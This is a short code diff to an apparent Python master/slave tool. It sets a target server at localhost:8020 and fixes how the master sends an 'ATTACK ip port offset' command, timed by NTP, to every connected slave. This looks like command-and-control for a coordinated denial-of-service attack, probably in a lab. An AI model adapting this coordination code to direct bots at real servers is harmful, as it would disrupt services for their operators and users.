@@ -10,6 +10,10 @@ class Master():
       self.sock = sock
     self.slaves = {}
 
+    # The server to be attacked
+    self.server_ip = 'localhost'
+    self.server_port = 8020
+
     # get ntp times
     self.ntpc = ntplib.NTPClient()
     self.ntp_res = self.ntpc.request('europe.pool.ntp.org', version=3)
@@ -34,7 +38,7 @@ class Master():
     ntpc = ntplib.NTPClient()
     ntp_res = ntpc.request('europe.pool.ntp.org', version=3)
     for slave_addr, conn in self.slaves.iteritems():
-      conn.send('ATTACK {0} {1} {2}'.format(server_ip, server_port, ntp_res.offset))
+      conn.send('ATTACK {0} {1} {2}'.format(self.server_ip, self.server_port, ntp_res.offset))
 
 if __name__ == '__main__':
     port = 8081
